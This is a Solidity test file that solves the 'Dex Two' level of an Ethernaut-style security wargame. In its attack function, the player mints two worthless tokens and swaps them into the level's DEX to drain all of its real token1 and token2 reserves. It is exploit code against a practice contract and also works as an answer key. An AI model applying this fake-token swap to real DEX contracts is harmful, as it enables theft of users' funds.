// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.26;

import {Tests} from "@/02_security/core/Tests.sol";
import {DexTwoFactory, DexTwo, SwappableTokenTwo, IERC20} from "@/02_security/levels/23_DexTwo/DexTwoFactory.sol";

contract TestDexTwo is Tests {
    DexTwo private level;

    IERC20 private token1;
    IERC20 private token2;

    constructor() {
        levelFactory = new DexTwoFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = DexTwo(levelAddress);

        token1 = IERC20(level.token1());
        token2 = IERC20(level.token2());
        assertTrue(token1.balanceOf(levelAddress) == 100 && token2.balanceOf(levelAddress) == 100);
        assertTrue(token1.balanceOf(PLAYER) == 10 && token2.balanceOf(PLAYER) == 10);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), "FakeToken", "FTN", 10_000);
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), "FakeToken", "FTN", 10_000);

        fakeToken1.approve(address(level), 1);
        fakeToken2.approve(address(level), 1);
        fakeToken1.transfer(address(level), 1);
        fakeToken2.transfer(address(level), 1);
        level.swap(address(fakeToken1), address(token1), 1);
        level.swap(address(fakeToken2), address(token2), 1);
        assertTrue(token1.balanceOf(address(level)) == 0 && token2.balanceOf(address(level)) == 0);

        vm.stopPrank();
    }

    function testLevel() external {
        runLevel();
    }
}